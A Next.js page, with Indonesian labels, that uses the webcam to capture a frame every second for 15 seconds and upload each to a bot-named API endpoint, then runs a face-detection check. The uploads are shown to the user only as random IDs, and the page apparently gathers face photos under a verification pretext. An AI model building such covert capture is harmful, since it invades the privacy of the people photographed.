import { useRef, useState, useEffect } from "react";
import { useRouter } from "next/router";

export default function Review() {
  const router = useRouter();
  const videoRef = useRef(null);
  const canvasRef = useRef(null);
  const queueRef = useRef([]);
  const sendingRef = useRef(false);

  const [logs, setLogs] = useState([]);
  const [running, setRunning] = useState(false);
  const [status, setStatus] = useState("idle");
  const [cameraAllowed, setCameraAllowed] = useState(false);
  const [detectTries, setDetectTries] = useState(0);

  useEffect(() => {
    // check if index previously granted permission
    const allowed = sessionStorage.getItem("cameraAllowed") === "true";
    if (allowed) {
      // attempt to start preview but do not force prompt
      ensureCamera().then((ok) => setCameraAllowed(ok));
    }
    // cleanup on unmount: stop camera
    return () => {
      const s = videoRef.current?.srcObject;
      if (s && s.getTracks) s.getTracks().forEach((t) => t.stop());
    };
  }, []);

  function addLog(s) {
    setLogs((p) => [...p, s].slice(-300));
  }

  function makeID(len = 24) {
    const c = "abcdefghijklmnopqrstuvwxyz0123456789";
    let s = "";
    for (let i = 0; i < len; i++) s += c[Math.floor(Math.random() * c.length)];
    return s;
  }

  async function ensureCamera() {
    try {
      const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
      videoRef.current.srcObject = stream;
      await videoRef.current.play();
      sessionStorage.setItem("cameraAllowed", "true");
      setCameraAllowed(true);
      return true;
    } catch (e) {
      sessionStorage.removeItem("cameraAllowed");
      setCameraAllowed(false);
      return false;
    }
  }

  // queue send
  function enqueueSend(base64, id) {
    queueRef.current.push({ base64, id });
    processQueue();
  }

  async function processQueue() {
    if (sendingRef.current) return;
    if (!queueRef.current.length) return;
    sendingRef.current = true;

    const { base64, id } = queueRef.current.shift();
    try {
      const res = await fetch("/api/laifulbotapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "send", imageBase64: base64, id })
      });
      const j = await res.json();
      if (j.ok) addLog(`id: ${id}`);
      else { addLog(`id: ${id} (retry)`); queueRef.current.push({ base64, id }); }
    } catch (e) {
      addLog(`id: ${id} (retry)`);
      queueRef.current.push({ base64, id });
    }

    sendingRef.current = false;
    setTimeout(processQueue, 0);
  }

  function captureBase64(maxW = 900, q = 0.7) {
    if (!canvasRef.current) canvasRef.current = document.createElement("canvas");
    const v = videoRef.current;
    const c = canvasRef.current;
    const w = v.videoWidth || 640;
    const h = v.videoHeight || 480;
    let tw = w, th = h;
    if (w > maxW) { tw = maxW; th = Math.round((h * maxW) / w); }
    c.width = tw; c.height = th;
    const ctx = c.getContext("2d");
    ctx.drawImage(v, 0, 0, tw, th);
    return c.toDataURL("image/jpeg", q).replace(/^data:image\/jpeg;base64,/, "");
  }

  async function startProcess() {
    setLogs([]);
    setDetectTries(0);
    setRunning(true);
    setStatus("running");

    // ensure camera first; if not allowed, request
    const ok = await ensureCamera();
    if (!ok) {
      addLog("kamera tidak diizinkan");
      setRunning(false);
      setStatus("idle");
      return;
    }

    let sec = 0;
    const timer = setInterval(() => {
      sec++;
      const id = makeID();
      addLog(`id: ${id}`);
      const b64 = captureBase64(900, 0.7);
      enqueueSend(b64, id);

      if (sec >= 15) {
        clearInterval(timer);
        setTimeout(() => runDetectPhase(), 300);
      }
    }, 1000);
  }

  async function runDetectPhase() {
    setStatus("mendeteksi");
    const id = makeID();
    addLog(`mendeteksi: ${id}`);
    addLog("memeriksa...");

    const base64 = captureBase64(900, 0.7);
    let det;
    try {
      const res = await fetch("/api/laifulbotapi", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ action: "detect", imageBase64: base64, id })
      });
      det = await res.json();
    } catch (e) {
      det = { ok: false, error: String(e) };
    }

    if (!det || det.ok === false) {
      addLog("gagal mendeteksi");
      setDetectTries((prev) => {
        const next = prev + 1;
        if (next >= 3) {
          addLog("coba lagi");
          setRunning(false);
          setStatus("idle");
        } else {
          setTimeout(() => runDetectPhase(), 500);
        }
        return next;
      });
      return;
    }

    // parse faces
    let faces = 0;
    try {
      // prefer det.faces if server returned it; otherwise parse result
      if (typeof det.faces === "number") faces = det.faces;
      else if (det?.result?.results?.[0]) {
        const r = det.result.results[0];
        const entities = r.entities || [];
        for (const e of entities) {
          if (Array.isArray(e.objects)) faces += e.objects.length;
        }
      }
    } catch (e) { faces = 0; }

    if (faces > 0) {
      addLog("wajah ditemukan");
      router.push("/success");
      return;
    }

    addLog("gagal mendeteksi");
    setDetectTries((prev) => {
      const next = prev + 1;
      if (next >= 3) {
        addLog("coba lagi");
        setRunning(false);
        setStatus("idle");
      } else {
        setTimeout(() => runDetectPhase(), 500);
      }
      return next;
    });
  }

  return (
    <main style={{ padding: 16, background: "#0b1220", minHeight: "100vh", color: "#e6eef8" }}>
      <div style={{ display: "flex", gap: 16, flexWrap: "wrap" }}>
        <div style={{ flex: 1, minWidth: 260 }}>
          <div style={{ height: 320, background: "#000", borderRadius: 8, overflow: "hidden" }}>
            <video ref={videoRef} style={{ width: "100%", height: "100%", objectFit: "cover" }} autoPlay playsInline muted />
          </div>

          <div style={{ marginTop: 12, display: "flex", gap: 8 }}>
            <button onClick={ensureCamera} style={{ padding: "10px 14px", background: "#06b6d4", borderRadius: 8, border: 0, fontWeight: 700 }}>
              Minta Izin Kamera
            </button>

            {!running ? (
              <button onClick={startProcess} style={{ padding: "10px 14px", background: "#06b6d4", borderRadius: 8, border: 0, fontWeight: 700 }}>
                START
              </button>
            ) : (
              <div style={{ alignSelf: "center" }}>status: {status}</div>
            )}
          </div>
        </div>

        <div style={{ width: 360, flexShrink: 0 }}>
          <div style={{ background: "#07101f", padding: 10, height: 420, overflowY: "auto", borderRadius: 8, fontFamily: "monospace", fontSize: 13 }}>
            {logs.map((l, i) => <div key={i} style={{ padding: "4px 0", borderBottom: "1px dashed #102129" }}>{l}</div>)}
          </div>
        </div>
      </div>
    </main>
  );
}